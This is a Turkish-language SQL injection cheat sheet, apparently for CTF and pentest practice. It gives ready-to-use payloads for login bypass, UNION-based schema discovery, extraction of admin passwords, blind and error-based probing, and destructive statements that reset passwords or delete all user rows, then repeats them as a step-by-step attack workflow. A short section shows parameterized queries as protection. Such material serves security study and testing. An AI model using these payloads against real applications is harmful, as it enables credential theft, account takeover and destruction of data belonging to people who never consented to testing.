**SQL Injection**, kullanıcı girdisinin **kontrolsüzce SQL sorgularına** eklenmesiyle ortaya çıkar. 🚨  
Saldırganlar bu sayede **veri çalabilir, değiştirebilir veya sistem manipüle edebilir**. 💻🕵️

---

## 🔹 1️⃣ Temel Kullanım – Login Bypass

```sql
' OR '1'='1                 -- Basit bypass, her zaman doğru
' OR username='admin' --     -- Admin login atlatma
' UNION SELECT username, password FROM users; --   -- Tüm kullanıcıları listeleme
```

💡 **İpucu:** Basit OR koşulları ve UNION sorguları, başlangıç için en çok kullanılan yöntemlerdir.

---

## 🔹 2️⃣ Veri Tabanı ve Tablo Keşfi

```sql
' UNION SELECT table_name, null FROM information_schema.tables; -- Tabloları öğren
' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'; -- Kolonlar
```

📂 **Hedef:** Önce hangi tablolar ve kolonlar var, öğrenmek.

---

## 🔹 3️⃣ Veri Çekme (Exfiltration)

```sql
' UNION SELECT username, (SELECT password FROM users WHERE username='admin') FROM dual; -- Admin şifresi
' UNION SELECT username, password FROM users WHERE username=0x61646D696E; -- Hex ile 'admin'
```

💥 **Hack & CTF:** Özel veri sızdırmak için alt sorgular ve hex kodları kullanılır.

---

## 🔹 4️⃣ Veri Değiştirme / Silme

```sql
' ; UPDATE users SET password='hacked' WHERE username='alice'; -- Şifre değiştirme
' ; DELETE FROM users; -- Tüm verileri sil
```

⚠️ **Dikkat:** Gerçek sistemlerde riskli! Test ortamında çalıştırın.

---

## 🔹 5️⃣ Blind SQL Injection

```sql
' AND SUBSTRING(password,1,1)='a' -- Boolean tabanlı
' OR IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) -- Zaman tabanlı
```

⏳ **Zor durum:** Veri görünmüyorsa boolean ve zaman tabanlı teknikler kullanılır.

---

## 🔹 6️⃣ Error-Based SQL Injection

```sql
' AND 1=CONVERT(int,(SELECT @@version)) -- Hatalardan veritabanı sürümü öğren
```

🛠️ **Hedef:** Veritabanı bilgilerini hata mesajlarından çıkarmak.

---

## 🔹 7️⃣ Second-Order SQL Injection

```sql
-- Kullanıcı girdisi önce kaydedilir
test' OR '1'='1
-- Sonra başka sorguda tetiklenir
```

🔄 **Karmaşık senaryo:** Girdi ilk aşamada zararsız görünür, sonra tetiklenir.

---

## 🔹 8️⃣ Parametrized Queries / Korunma

```python
# Python
cursor.execute("SELECT * FROM users WHERE username=%s AND password=%s", (user, passwd))
```

```php
# PHP PDO
$stmt = $pdo->prepare('SELECT * FROM users WHERE username=? AND password=?');
$stmt->execute([$user, $passwd]);
```

✅ **Öneri:** Parametrized queries ve prepared statements her zaman güvenli.

---

## 🔹 9️⃣ CTF / Pentest Workflow – Strateji

1. **Login bypass denemeleri**
	```sql
    ' OR '1'='1                                                                    ' 
	' OR username='admin' --
    ```   
    
2. **Tablo ve kolon keşfi**
    
    ```sql
    ' UNION SELECT table_name, null FROM information_schema.tables; --
    ' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'; --
    ```
    
3. **Veri sızdırma**
    
    ```sql
    ' UNION SELECT username, password FROM users; --
    ' UNION SELECT username, (SELECT password FROM users WHERE username='admin') FROM dual; --
    ```
    
4. **Blind injection (zor durumda)**
    
    ```sql
    ' AND SUBSTRING(password,1,1)='a' --
    ' OR IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --
    ```
    
5. **Veri değiştirme / silme (kritik testlerde dikkat!)**
    
    ```sql
    ' ; UPDATE users SET password='hacked' WHERE username='alice'; --
    ' ; DELETE FROM users; --
    ```
    

---

## 🔹 1️⃣0️⃣ Özet

- **SQL Injection =** Kullanıcı girdisinin kontrolsüzce SQL sorgusuna eklenmesi
    
- **Riskler =** Veri sızdırma, değiştirme, yetki ele geçirme
    
- **Korunma =** Parametrized queries ✅, input validation ✅, minimum yetki 🔒
    
- **CTF odaklı =** Login bypass, tablo keşfi, veri sızdırma ve blind teknikler 🌟
    

---
